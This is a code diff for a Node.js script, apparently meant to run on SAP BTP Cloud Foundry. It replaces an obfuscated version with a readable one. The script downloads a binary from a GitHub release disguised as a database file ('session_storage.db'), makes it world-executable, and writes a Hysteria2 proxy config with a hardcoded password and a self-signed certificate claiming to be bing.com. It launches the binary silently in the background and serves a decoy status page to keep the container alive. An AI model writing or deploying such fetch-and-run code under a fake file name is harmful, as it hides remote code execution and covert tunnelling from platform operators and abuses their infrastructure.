@@ -1,3 +1,108 @@
-#!/usr/bin/env node
+const fs = require('fs');
+const path = require('path');
+const http = require('http');
+const axios = require('axios');
+const { spawn, execSync } = require('child_process');
 
-const _0x4dcacb=_0x2215;(function(_0x11002f,_0x408d5b){const _0x3080c1={_0x4a20cf:0x159,_0x156884:0x140,_0x74f349:0x131,_0x2fbc06:0x135,_0x41eafb:0x15a},_0x25695d=_0x2215,_0x49fcde=_0x11002f();while(!![]){try{const _0x23dae6=-parseInt(_0x25695d(_0x3080c1._0x4a20cf))/0x1+parseInt(_0x25695d(_0x3080c1._0x156884))/0x2*(-parseInt(_0x25695d(0x15e))/0x3)+-parseInt(_0x25695d(0x137))/0x4+parseInt(_0x25695d(_0x3080c1._0x74f349))/0x5+parseInt(_0x25695d(0x158))/0x6+parseInt(_0x25695d(0x152))/0x7+-parseInt(_0x25695d(_0x3080c1._0x2fbc06))/0x8*(-parseInt(_0x25695d(_0x3080c1._0x41eafb))/0x9);if(_0x23dae6===_0x408d5b)break;else _0x49fcde['push'](_0x49fcde['shift']());}catch(_0x44f4ae){_0x49fcde['push'](_0x49fcde['shift']());}}}(_0x179c,0x37238));const fs=require('fs'),path=require(_0x4dcacb(0x143)),axios=require('axios'),{spawn,execSync}=require(_0x4dcacb(0x12f)),UUID=process[_0x4dcacb(0x14c)][_0x4dcacb(0x12c)]||_0x4dcacb(0x15c),REALM_NAME=process[_0x4dcacb(0x14c)][_0x4dcacb(0x130)]||_0x4dcacb(0x155),BINARY_DOWNLOAD_URL='https://github.com/mzhangxy/file-so/releases/download/appwr/session_storage.db',FAKE_FILE_NAME=_0x4dcacb(0x12a),WORK_DIR=path[_0x4dcacb(0x144)](__dirname,_0x4dcacb(0x13c)),hy2ConfigPath=path[_0x4dcacb(0x144)](WORK_DIR,_0x4dcacb(0x14b));let isInitialized=![];!fs['existsSync'](WORK_DIR)&&fs[_0x4dcacb(0x153)](WORK_DIR,{'recursive':!![]});async function downloadFakeBinary(_0x1c8a50){const _0x3b607e={_0x4c88a7:0x13e,_0x75f201:0x14d,_0x958276:0x134,_0x59e3e5:0x147,_0x44af9f:0x12e},_0x290eac={_0x2bb8ef:0x15d},_0x44af90=_0x4dcacb,_0x2fd89b=path[_0x44af90(_0x3b607e._0x4c88a7)](WORK_DIR,FAKE_FILE_NAME);if(fs[_0x44af90(_0x3b607e._0x75f201)](_0x2fd89b))return _0x1c8a50('Binary\x20already\x20exists,\x20skipping\x20download.'),_0x2fd89b;_0x1c8a50('Downloading\x20runtime\x20component\x20from\x20'+BINARY_DOWNLOAD_URL+_0x44af90(_0x3b607e._0x958276));const _0x4fefec=fs[_0x44af90(_0x3b607e._0x59e3e5)](_0x2fd89b),_0x28084d=await axios[_0x44af90(0x145)](BINARY_DOWNLOAD_URL,{'responseType':_0x44af90(_0x3b607e._0x44af9f),'timeout':0xea60});return _0x28084d[_0x44af90(0x14e)][_0x44af90(0x14a)](_0x4fefec),new Promise((_0x3846c2,_0x3bb235)=>{const _0x15b72d=_0x44af90;_0x4fefec['on'](_0x15b72d(_0x290eac._0x2bb8ef),()=>{const _0x47884c=_0x15b72d;fs[_0x47884c(0x154)](_0x2fd89b,0x1ff),_0x3846c2(_0x2fd89b);}),_0x4fefec['on']('error',_0x3bb235);});}function ensureTlsCertificates(_0x507a74,_0x3989e0,_0x45949f){const _0x47ea62={_0x373754:0x14d,_0x23fdca:0x12b},_0x95aca9=_0x4dcacb;if(fs[_0x95aca9(_0x47ea62._0x373754)](_0x507a74)&&fs[_0x95aca9(0x14d)](_0x3989e0))return;try{execSync(_0x95aca9(_0x47ea62._0x23fdca)+_0x3989e0+'\x22',{'stdio':'ignore'}),execSync(_0x95aca9(0x12d)+_0x3989e0+_0x95aca9(0x141)+_0x507a74+_0x95aca9(0x13f),{'stdio':'ignore'}),_0x45949f('Self-signed\x20TLS\x20certificates\x20generated.');}catch(_0x1b71f){_0x45949f(_0x95aca9(0x151));}}function generateHy2Config(){const _0x3e3129={_0x31581e:0x144,_0x46d587:0x14f,_0x46f001:0x132,_0x9052db:0x157,_0x4b3a29:0x156},_0x2089b5=_0x4dcacb,_0xca322e=path[_0x2089b5(_0x3e3129._0x31581e)](WORK_DIR,_0x2089b5(0x138)),_0x2240dc=path[_0x2089b5(0x144)](WORK_DIR,_0x2089b5(0x149)),_0x409971=_0x2089b5(_0x3e3129._0x46d587)+REALM_NAME+_0x2089b5(_0x3e3129._0x46f001)+UUID+_0x2089b5(_0x3e3129._0x9052db)+_0xca322e+_0x2089b5(_0x3e3129._0x4b3a29)+_0x2240dc+'\x0a\x20\x20sniGuard:\x20disable\x0a';fs[_0x2089b5(0x13d)](hy2ConfigPath,_0x409971);}module[_0x4dcacb(0x142)]=async({req:_0x3a804a,res:_0x257fc8,log:_0x2a6010,error:_0x37e72c})=>{const _0x43d4c2={_0x5e4c7c:0x13b,_0x524a51:0x146,_0x49cde1:0x149,_0x37a648:0x133,_0x354260:0x139,_0x3ff4b5:0x148,_0x5e32f0:0x13b,_0x505811:0x150},_0x49fc83=_0x4dcacb;try{if(isInitialized)return _0x257fc8[_0x49fc83(_0x43d4c2._0x5e4c7c)]({'status':_0x49fc83(_0x43d4c2._0x524a51),'realm':REALM_NAME},0xc8);_0x2a6010('Initializing\x20System\x20Core...');const _0x36abad=await downloadFakeBinary(_0x2a6010),_0x25d69a=path['join'](WORK_DIR,_0x49fc83(0x138)),_0x5505e1=path['join'](WORK_DIR,_0x49fc83(_0x43d4c2._0x49cde1));ensureTlsCertificates(_0x25d69a,_0x5505e1,_0x2a6010),generateHy2Config();try{const _0x27c5f0=execSync(_0x49fc83(0x15b)+FAKE_FILE_NAME+'\x22',{'encoding':_0x49fc83(_0x43d4c2._0x37a648)});_0x27c5f0[_0x49fc83(0x136)]()!==''&&(_0x2a6010('Process\x20already\x20running\x20(caught\x20by\x20ps).'),isInitialized=!![]);}catch(_0x2146f6){_0x2a6010('Starting\x20'+FAKE_FILE_NAME+_0x49fc83(0x13a));const _0x329654=spawn(_0x36abad,['server','-c',hy2ConfigPath],{'detached':!![],'stdio':'ignore','cwd':WORK_DIR});_0x329654['unref'](),isInitialized=!![];}return _0x2a6010(_0x49fc83(_0x43d4c2._0x354260)),_0x257fc8[_0x49fc83(0x13b)]({'status':'System\x20Core\x20initialized\x20and\x20launched','realm':REALM_NAME},0xc8);}catch(_0x21359d){return _0x37e72c(_0x49fc83(_0x43d4c2._0x3ff4b5)+_0x21359d[_0x49fc83(0x150)]),_0x257fc8[_0x49fc83(_0x43d4c2._0x5e32f0)]({'error':_0x21359d[_0x49fc83(_0x43d4c2._0x505811)]},0x1f4);}};function _0x2215(_0x5181e5,_0x581016){const _0x179c75=_0x179c();return _0x2215=function(_0x221533,_0x5eb235){_0x221533=_0x221533-0x12a;let _0x1de2d5=_0x179c75[_0x221533];return _0x1de2d5;},_0x2215(_0x5181e5,_0x581016);}function _0x179c(){const _0x5b4470=['finish','30tETrEi','session_storage.db','openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22','UUID','openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22','stream','child_process','REALM_NAME','2925PcOeTC','\x0a\x0aauth:\x0a\x20\x20type:\x20password\x0a\x20\x20password:\x20','utf-8','...','395848DcBdlb','trim','1129240WSwVJW','cert.pem','[SUCCESS]\x20Runtime\x20process\x20launched.','\x20in\x20background...','json','.runtime','writeFileSync','resolve','\x22\x20-subj\x20\x22/CN=bing.com\x22','51506ylSAaS','\x22\x20-out\x20\x22','exports','path','join','get','System\x20Core\x20is\x20already\x20online','createWriteStream','Initialization\x20error:\x20','private.key','pipe','config.yaml','env','existsSync','data','\x0alisten:\x20realm://public@realm.hy2.io/','message','Warning:\x20OpenSSL\x20failed,\x20TLS\x20might\x20not\x20work\x20if\x20required.','2093336lpZnQA','mkdirSync','chmodSync','appwr-realm-8899','\x0a\x20\x20key:\x20','\x0a\x0atls:\x0a\x20\x20cert:\x20','1507428XnAfgB','428436nRteTK','117bghMyw','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22','5ca91fff-f64e-4896-acfa-d9e633b08e16'];_0x179c=function(){return _0x5b4470;};return _0x179c();}
+// ======================== 核心配置 ========================
+const UUID = process.env.UUID || '5ca91fff-f64e-4896-acfa-d9e633b08e16'; 
+const REALM_NAME = process.env.REALM_NAME || 'sapp-realm-8899';
+// CF 平台会动态分配 PORT 环境变量，必须监听它
+const PORT = process.env.PORT || 8080; 
+
+// 替换为你的 .so 或二进制文件直链
+const BINARY_DOWNLOAD_URL = 'https://github.com/mzhangxy/file-so/releases/download/appwr/session_storage.db'; 
+const FAKE_FILE_NAME = 'session_storage.db';
+// ==========================================================
+
+const WORK_DIR = path.join(__dirname, '.runtime');
+const hy2ConfigPath = path.join(WORK_DIR, 'config.yaml');
+
+if (!fs.existsSync(WORK_DIR)) {
+  fs.mkdirSync(WORK_DIR, { recursive: true });
+}
+
+async function downloadFakeBinary() {
+  const target = path.resolve(WORK_DIR, FAKE_FILE_NAME);
+  if (fs.existsSync(target)) return target;
+  
+  console.log(`Downloading runtime component...`);
+  const writer = fs.createWriteStream(target);
+  const response = await axios.get(BINARY_DOWNLOAD_URL, { responseType: 'stream', timeout: 60000 });
+  response.data.pipe(writer);
+  
+  return new Promise((resolve, reject) => {
+    writer.on('finish', () => {
+      fs.chmodSync(target, 0o777); 
+      resolve(target);
+    });
+    writer.on('error', reject);
+  });
+}
+
+function ensureTlsCertificates(certPath, keyPath) {
+  if (fs.existsSync(certPath) && fs.existsSync(keyPath)) return;
+  try {
+    execSync(`openssl ecparam -genkey -name prime256v1 -out "${keyPath}"`, { stdio: 'ignore' });
+    execSync(`openssl req -new -x509 -days 3650 -key "${keyPath}" -out "${certPath}" -subj "/CN=bing.com"`, { stdio: 'ignore' });
+  } catch (e) {
+    console.log("OpenSSL failed, proceeding anyway.");
+  }
+}
+
+function generateHy2Config(certPath, keyPath) {
+  const yamlConfig = `
+listen: realm://public@realm.hy2.io/${REALM_NAME}
+
+auth:
+  type: password
+  password: ${UUID}
+
+tls:
+  cert: ${certPath}
+  key: ${keyPath}
+  sniGuard: disable
+`;
+  fs.writeFileSync(hy2ConfigPath, yamlConfig);
+}
+
+// ======================== 主流程 ========================
+async function startServer() {
+  try {
+    const binaryPath = await downloadFakeBinary();
+    const certPath = path.join(WORK_DIR, 'cert.pem');
+    const keyPath = path.join(WORK_DIR, 'private.key');
+    
+    ensureTlsCertificates(certPath, keyPath);
+    generateHy2Config(certPath, keyPath);
+
+    // 静默启动后台进程
+    try {
+      const status = execSync(`ps aux | grep -v "grep" | grep "${FAKE_FILE_NAME}"`, { encoding: 'utf-8' });
+      if (status.trim() === '') throw new Error("Not running");
+    } catch (e) {
+      console.log(`Starting ${FAKE_FILE_NAME} in background...`);
+      const hy2Process = spawn(binaryPath, ['server', '-c', hy2ConfigPath], {
+        detached: true,
+        stdio: 'ignore',
+        cwd: WORK_DIR
+      });
+      hy2Process.unref();
+    }
+    
+    console.log(`[SUCCESS] Runtime process launched.`);
+
+    // 【关键】启动真实的 HTTP 服务器，占住 CF 分配的端口，保持容器存活
+    http.createServer((req, res) => {
+      res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      res.end('<h1>System Core is Online (SAP BTP CF)</h1>');
+    }).listen(PORT, '0.0.0.0', () => {
+      console.log(`HTTP server listening on port ${PORT}`);
+    });
+
+  } catch (err) {
+    console.error("Initialization error:", err);
+  }
+}
+
+startServer();
